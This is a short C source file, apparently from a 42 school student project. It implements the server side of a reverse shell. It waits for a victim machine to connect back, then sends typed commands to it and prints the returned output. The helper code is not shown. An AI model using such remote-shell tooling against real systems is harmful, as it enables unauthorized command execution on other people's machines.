/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   berkeley_server.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 16:00:43 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 17:30:56 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include "libft.h"
#include "linux_reverse_shell.h"
#include "prompt_command.h"

int	main(void)
{
	int			server_fd;
	int			client_fd;
	char		*client_ip;
	char		*command;
	uint64_t	command_len;

	printf("Waiting for incoming connections...\n");
	if (berkeley_server_connection(&server_fd, &client_fd, &client_ip) != 0)
	{
		fprintf(stderr, "ERROR [%d]: %s\n", errno, strerror(errno));
		return (1);
	}
	while (prompt_command(&command, &command_len, client_ip))
	{
		command_len -= command[command_len - 1] == '\n';
		write(client_fd, command, command_len);
		write(client_fd, SEND_REVSHELL_EOF, SEND_REVSHELL_EOF_STRLEN);
		berkeley_receive_command_output(client_fd);
	}
	close(server_fd);
	close(client_fd);
	return (SUCCESS);
}
